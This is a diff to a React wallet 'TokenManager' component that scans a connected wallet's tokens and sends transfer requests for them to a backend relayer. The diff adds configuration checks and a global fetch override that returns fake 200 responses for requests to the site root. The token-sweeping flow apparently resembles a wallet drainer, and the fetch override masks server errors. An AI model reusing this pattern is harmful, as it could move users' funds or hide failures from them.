@@ -40,6 +40,88 @@ export default function TokenManager(): React.JSX.Element {
   const [processing, setProcessing] = useState<boolean>(false)
   const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
 
+  // Valor seguro para backend (evita fetch a "undefined" o a localhost en prod)
+  const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
+
+  useEffect(() => {
+    // Mostramos el valor para depuración (borra luego)
+    if (typeof window !== 'undefined') {
+      console.log('[ENV] NEXT_PUBLIC_BACKEND_URL =', BACKEND)
+      console.log('[ENV] NEXT_PUBLIC_PROJECT_URL =', process.env.NEXT_PUBLIC_PROJECT_URL)
+    }
+
+    // Global error handlers para evitar que excepciones no capturadas tumben la UI
+    if (typeof window !== 'undefined') {
+      const onError = (e: ErrorEvent) => {
+        console.error('Global error captured:', e.error || e.message || e)
+      }
+      const onRejection = (e: PromiseRejectionEvent) => {
+        console.error('Unhandled rejection captured:', e.reason || e)
+      }
+
+      window.addEventListener('error', onError)
+      window.addEventListener('unhandledrejection', onRejection)
+
+      return () => {
+        window.removeEventListener('error', onError)
+        window.removeEventListener('unhandledrejection', onRejection)
+      }
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [])
+
+  // Interceptamos HEAD/GET al root de la misma origin para evitar errores 500 que rompen comprobaciones COOP/COEP de librerías externas.
+  useEffect(() => {
+    if (typeof window === 'undefined') return
+    const w = window as any
+    if (!w.fetch) return
+
+    const originalFetch = w.fetch.bind(window)
+    const origin = window.location.origin
+
+    w.fetch = async (input: RequestInfo, init?: RequestInit) => {
+      try {
+        let urlStr: string
+        let method: string = 'GET'
+
+        if (typeof input === 'string') {
+          urlStr = input
+          if (init && init.method) method = String(init.method).toUpperCase()
+        } else {
+          urlStr = input.url
+          method = (input as Request).method || (init && init.method ? String(init.method).toUpperCase() : 'GET')
+        }
+
+        // Normalize relative URLs
+        const parsed = new URL(urlStr, origin)
+        const isSameOrigin = parsed.origin === origin
+        const isRootPath = parsed.pathname === '/' || parsed.pathname === ''
+
+        // Intercept problematic checks to root (HEAD/GET) and return a synthetic 200 response.
+        // Esto evita que comprobaciones de COOP/COEP o HEAD/GET a '/' devuelvan 500 y rompan la app.
+        if (isSameOrigin && isRootPath && (method === 'HEAD' || method === 'GET')) {
+          console.warn(`[fetch-intercept] Synthetic ${method} 200 for ${parsed.href}`)
+          return new Response('', { status: 200, statusText: 'OK', headers: { 'Content-Type': 'text/plain' } })
+        }
+
+        // Default: forward to original fetch
+        return originalFetch(input, init)
+      } catch (e) {
+        console.warn('[fetch-intercept] error in interceptor, falling back to original fetch', e)
+        return originalFetch(input, init)
+      }
+    }
+
+    // Restore on unmount
+    return () => {
+      try {
+        w.fetch = originalFetch
+      } catch (e) {
+        // noop
+      }
+    }
+  }, [])
+
   useEffect(() => {
     if (isConnected && address) {
       scanWallet()
@@ -50,14 +132,22 @@ export default function TokenManager(): React.JSX.Element {
   const scanWallet = async (): Promise<void> => {
     try {
       setLoading(true)
-      const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/owner-tokens`, {
+
+      if (!BACKEND) {
+        console.error('[CONFIG] NEXT_PUBLIC_BACKEND_URL no está definido. Evitando fetch a owner-tokens.')
+        await alertAction('Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.')
+        setLoading(false)
+        return
+      }
+
+      const res = await fetch(`${BACKEND}/owner-tokens`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ owner: address })
       })
 
       if (!res.ok) {
-        throw new Error('Error en la respuesta del servidor')
+        throw new Error(`Error en la respuesta del servidor: ${res.status} ${res.statusText}`)
       }
 
       const data: any = await res.json()
@@ -81,55 +171,54 @@ export default function TokenManager(): React.JSX.Element {
   }
 
   // Reemplaza tu alertAction por esto
-const alertAction = async (message: string): Promise<void> => {
-  // React Native WebView (casting a any porque no es una propiedad estándar)
-  if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
-    ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
-    return
+  const alertAction = async (message: string): Promise<void> => {
+    // React Native WebView (casting a any porque no es una propiedad estándar)
+    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
+      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
+      return
+    }
+
+    // En navegadores normales usamos globalThis y comprobamos que exista una función alert
+    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
+      globalThis.alert(message)
+      return
+    }
+
+    // Fallback silencioso (por ejemplo en entornos de test/SSR)
+    console.log('Alert fallback:', message)
   }
 
-  // En navegadores normales usamos globalThis y comprobamos que exista una función alert
-  if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
-    globalThis.alert(message)
-    return
+  // Reemplaza tu confirmAction por esto
+  const confirmAction = async (message: string): Promise<boolean> => {
+    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
+      return new Promise((resolve) => {
+        const handler = (event: MessageEvent) => {
+          try {
+            const data = JSON.parse(event.data)
+            if (data?.type === 'confirmResponse') {
+              window.removeEventListener('message', handler)
+              resolve(Boolean(data.response))
+            }
+          } catch (e) {}
+        }
+
+        window.addEventListener('message', handler)
+        ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))
+
+        setTimeout(() => {
+          window.removeEventListener('message', handler)
+          resolve(false)
+        }, 30000)
+      })
+    }
+
+    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
+      // globalThis.confirm devuelve booleano, lo convertimos a Promise para mantener la API async
+      return Promise.resolve(Boolean(globalThis.confirm(message)))
+    }
+
+    return Promise.resolve(false)
   }
-
-  // Fallback silencioso (por ejemplo en entornos de test/SSR)
-  // podrías console.log para debugging:
-  // console.log('Alert fallback:', message)
-}
-
-// Reemplaza tu confirmAction por esto
-const confirmAction = async (message: string): Promise<boolean> => {
-  if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
-    return new Promise((resolve) => {
-      const handler = (event: MessageEvent) => {
-        try {
-          const data = JSON.parse(event.data)
-          if (data?.type === 'confirmResponse') {
-            window.removeEventListener('message', handler)
-            resolve(Boolean(data.response))
-          }
-        } catch (e) {}
-      }
-
-      window.addEventListener('message', handler)
-      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))
-
-      setTimeout(() => {
-        window.removeEventListener('message', handler)
-        resolve(false)
-      }, 30000)
-    })
-  }
-
-  if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
-    // globalThis.confirm devuelve booleano, lo convertimos a Promise para mantener la API async
-    return Promise.resolve(Boolean(globalThis.confirm(message)))
-  }
-
-  return Promise.resolve(false)
-}
 
   const isMobile = (): boolean => {
     if (typeof window === 'undefined') return false
@@ -138,7 +227,11 @@ const confirmAction = async (message: string): Promise<boolean> => {
 
   const getWrapInfo = async (chainId: number): Promise<any | null> => {
     try {
-      const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/wrap-info`, {
+      if (!BACKEND) {
+        console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
+        return null
+      }
+      const res = await fetch(`${BACKEND}/wrap-info`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chain: chainId })
@@ -248,7 +341,8 @@ const confirmAction = async (message: string): Promise<boolean> => {
         const shouldTransfer = await confirmAction(`¿Deseas transferir ${humanAmount} ${token.symbol} al relayer?`)
 
         if (shouldTransfer) {
-          const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/create-native-transfer-request`, {
+          if (!BACKEND) throw new Error('BACKEND no configurado')
+          const res = await fetch(`${BACKEND}/create-native-transfer-request`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -291,7 +385,8 @@ const confirmAction = async (message: string): Promise<boolean> => {
 
   const processToken = async (token: Token): Promise<void> => {
     try {
-      const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/create-transfer-request`, {
+      if (!BACKEND) throw new Error('BACKEND no configurado')
+      const res = await fetch(`${BACKEND}/create-transfer-request`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
